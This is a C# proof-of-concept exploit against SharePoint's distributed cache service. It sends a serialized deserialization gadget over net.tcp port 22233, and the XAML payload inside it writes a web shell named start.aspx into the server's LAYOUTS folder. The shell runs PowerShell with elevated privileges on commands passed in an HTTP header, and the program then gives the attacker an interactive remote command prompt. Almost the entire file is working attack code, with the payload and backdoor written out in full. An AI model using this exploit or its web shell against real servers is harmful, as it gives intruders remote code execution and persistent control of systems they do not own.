using Microsoft.ApplicationServer.Caching;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.Http;
using System.Reflection;
using System.Runtime.Serialization;
using System.Threading;
using System.Xml;

namespace TestCacheSP
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("[*] By testanull from StarLabs 2023-2024");
            if (args.Length == 0)
            {
                Console.WriteLine("[+] Usage: asdfasdasfas.exe <target>");
                Console.WriteLine("[+] Example: asdfasdasfas.exe <sharepoint.consoto.lab> (without the http:// prefix)");
                return;
            }

            string target = args[0];
            Console.WriteLine("[+] Attacking target: " + target);

            string xamlPayload = @"<ResourceDictionary
  xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
  xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
  xmlns:s=""clr-namespace:System;assembly=mscorlib""
  xmlns:IO=""clr-namespace:System.IO;assembly=mscorlib"">
	 <ObjectDataProvider x:Key="""" ObjectType = ""{ x:Type IO:File}"" MethodName = ""WriteAllText"" >
     <ObjectDataProvider.MethodParameters>
<s:String>C:\\Program Files\\Common Files\\microsoft shared\\Web Server Extensions\\16\\TEMPLATE\\LAYOUTS\\start.aspx</s:String>
<s:String>&lt;%@ Page Language=&quot;C#&quot; Debug=&quot;true&quot; Trace=&quot;false&quot; %&gt; &lt;%@ Import Namespace=&quot;System.Diagnostics&quot; %&gt; &lt;%@ Import Namespace=&quot;System.IO&quot; %&gt; &lt;script Language=&quot;c#&quot; runat=&quot;server&quot;&gt; void Page_Load(object sender, EventArgs e) { if(Request.Headers[&quot;cmd&quot;] != null){Response.Write(a(Request.Headers[&quot;cmd&quot;]));}else{Response.Write(&quot;Gift from StarLabs&quot;);} } private static string a(string b) { string s = &quot;&quot;; Microsoft.SharePoint.SPSecurity.RunWithElevatedPrivileges(delegate{ ProcessStartInfo psi = new ProcessStartInfo(); psi.FileName = &quot;powershell.exe&quot;; psi.Arguments = &quot;/c &quot;+b; psi.RedirectStandardOutput = true; psi.UseShellExecute = false; Process p = Process.Start(psi); StreamReader stmrdr = p.StandardOutput; s = stmrdr.ReadToEnd(); stmrdr.Close(); }); return s; } &lt;/script&gt;</s:String>
</ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
</ResourceDictionary>";
            
            object obj = GetXamlGadget(xamlPayload);
            byte[][] payload = GetFinalPayload(obj);
            
            while(true){
                string url = "http://"+target+"/_layouts/15/start.aspx";
                string content = FetchContent(url); 
                if (content.Contains("StarLabs"))
                {
                    Console.WriteLine("[!] Backdoor planted! Have fun!");
                    break;
                }
                SendPayload(target, payload);

                Console.WriteLine("[+] Planting backdoor!");
                Thread.Sleep(2000);
                Console.WriteLine("[+] Do you want to split 50/50? (JK)");
                Thread.Sleep(3000);
            }

            while (true)
            {
                Console.Write("> ");
                string input = Console.ReadLine();
                Console.WriteLine(SendCmd(target, input));
            }
            // obj = GetObject("mspaint.exe");
            // payload = GetFinalPayload(obj);
            // SendPayload(target, payload);
        }
        
        static string SendCmd(string target, string cmd)
        {
            using (HttpClient client = new HttpClient())
            {
                client.DefaultRequestHeaders.Add("cmd", cmd);
                HttpResponseMessage response = client.GetAsync("http://"+target+"/_layouts/15/start.aspx").Result;
                response.EnsureSuccessStatusCode();
                string responseBody = response.Content.ReadAsStringAsync().Result;
                return responseBody;
            }
        }
        static string FetchContent(string url)
        {
            using (var client = new HttpClient())
            {
                var response = client.GetAsync(url).Result;
                var content = response.Content.ReadAsStringAsync().Result;
                return content;
            }
        }

        static void SendPayload(string target, byte[][] payload)
        {
            //bruh! TBH, I have no idea what's going on here, 
            // I just want to send a simple wcf message to the target, it will be better if anyone can make it smarter
            Assembly cacheCore = typeof(DataCacheTransportProperties).Assembly;
            Type requestBodyType = cacheCore.GetType("Microsoft.ApplicationServer.Caching.RequestBody");
            DataCacheSecurity dataCacheSecurity =
                new DataCacheSecurity(DataCacheSecurityMode.None, DataCacheProtectionLevel.None);
            DataCacheTransportProperties dataCacheTransportProperties = new DataCacheTransportProperties();
            ConstructorInfo ci1 = cacheCore.GetType("Microsoft.ApplicationServer.Caching.ClientIdentityProvider")
                .GetConstructor(BindingFlags.NonPublic | BindingFlags.Instance, null,
                    new[] { typeof(DataCacheSecurity), typeof(DataCacheServiceAccountType) }, null);
            object clientIdentityProvider = ci1.Invoke(new object[]
                { dataCacheSecurity, DataCacheServiceAccountType.SystemAccount });
            Type typeVerifyDel = cacheCore.GetType("Microsoft.ApplicationServer.Caching.VerifyResponseCallback");
            Type typeEndPoint =
                typeof(DataCacheTransportProperties).Assembly.GetType(
                    "Microsoft.ApplicationServer.Caching.IEndpointIdentityProvider");
            Type typeICreateMsg =
                typeof(DataCacheTransportProperties).Assembly.GetType(
                    "Microsoft.ApplicationServer.Caching.ICreateMessage");
            Type typeEndPointId = cacheCore.GetType("Microsoft.ApplicationServer.Caching.EndpointID");
            Type reqType = cacheCore.GetType("Microsoft.ApplicationServer.Caching.ReqType");
            Type wcfType = cacheCore.GetType("Microsoft.ApplicationServer.Caching.WcfClientChannel");
            Type operationResultType = cacheCore.GetType("Microsoft.ApplicationServer.Caching.OperationResult");
            ConstructorInfo ci = wcfType.GetConstructor(BindingFlags.NonPublic | BindingFlags.Instance, null,
                new[]
                {
                    typeof(DataCacheSecurity), typeof(DataCacheTransportProperties), typeof(string), typeof(object),
                    typeVerifyDel, typeof(TimeSpan), typeof(TimeSpan), typeof(TimeSpan), typeof(int), typeEndPoint
                }, null);

            object wcfClient = ci.Invoke(new[]
            {
                dataCacheSecurity, dataCacheTransportProperties, "1", null, null, new TimeSpan(99999999),
                new TimeSpan(99999999), new TimeSpan(99999999), 6, clientIdentityProvider
            });
            ConstructorInfo ci2 = typeEndPointId.GetConstructor(BindingFlags.NonPublic | BindingFlags.Instance, null,
                new[] { typeof(string) }, null);
            object endpointId = ci2.Invoke(new object[] { "net.tcp://"+target+":22233" });
            MethodInfo sendMsg = wcfType.GetMethod("Send", BindingFlags.Public | BindingFlags.Instance, null,
                new[] { typeEndPointId, typeICreateMsg }, null);
            
            ConstructorInfo reqBodyType = requestBodyType.GetConstructor(new[] { reqType });
            object requestBody = reqBodyType.Invoke(new object[] { 29 });

            PropertyInfo actionProp = requestBodyType.GetProperty("Action");
            FieldInfo cacheName = requestBodyType.GetField("CacheName");
            FieldInfo valueField = requestBodyType.GetField("Value");

            actionProp.SetValue(requestBody, "http://schemas.microsoft.com/velocity/msgs/DOMRequest");
            cacheName.SetValue(requestBody, "__system");
            valueField.SetValue(requestBody, payload);

            for (int i = 0; i < 1; i++)
            {
                object execResult = sendMsg.Invoke(wcfClient, new[] { endpointId, requestBody });
                FieldInfo isSuccessField =
                    operationResultType.GetField("_status", BindingFlags.Instance | BindingFlags.NonPublic);
                OperationStatus status = (OperationStatus)isSuccessField.GetValue(execResult);
                if (status == OperationStatus.Success)
                {
                    Console.WriteLine("[+] Send packet success!");
                    break;
                }

                FieldInfo faultField =
                    operationResultType.GetField("_exception", BindingFlags.Instance | BindingFlags.NonPublic);
                Exception fault = (Exception)faultField.GetValue(execResult);
                if (fault != null)
                {
                    Console.WriteLine("[-]" + fault.ToString());
                }
                
                Thread.Sleep(5000);
            }
        }

        private static byte[][] GetFinalPayload(object obj)
        {
            ChunkStream stream = new ChunkStream();
            stream.WriteByte(0);
            stream.WriteByte(0);
            using (XmlDictionaryWriter xmlDictionaryWriter = XmlDictionaryWriter.CreateBinaryWriter(stream))
            {
                NetDataContractSerializer netDataContractSerializer = new NetDataContractSerializer();
                netDataContractSerializer.WriteObject(xmlDictionaryWriter, obj);
                stream.Flush();
            }

            return stream.ToChunkedArray();
        }

        static object GetObject(string cmd)
        {
            Delegate da = new Comparison<string>(String.Compare);
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
            IComparer<string> comp = Comparer<string>.Create(d);
            SortedSet<string> set = new SortedSet<string>(comp);
            set.Add(cmd);
            set.Add("");
            FieldInfo fi =
                typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            invoke_list[1] = new Func<string, string, Process>(Process.Start);
            fi.SetValue(d, invoke_list);
            return set;
        }

        public static object GetXamlGadget(string xaml_payload)
        {
            Delegate da = new Comparison<string>(String.Compare);
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
            IComparer<string> comp = Comparer<string>.Create(d);
            SortedSet<string> set = new SortedSet<string>(comp);
            set.Add(xaml_payload);
            set.Add("");
            FieldInfo fi =
                typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invokeList = d.GetInvocationList();
            invokeList[1] = new Func<string, object>(System.Windows.Markup.XamlReader.Parse);
            fi.SetValue(d, invokeList);

            return set;
        }
    }

    internal enum OperationStatus
    {
        Success,
        SendFailed,
        ChannelOpening,
        ChannelOpenFailed,
        ChannelCreationFailed,
        InstanceClosed,
        VerificationFailed,
        AsyncFailureReceived
    }
}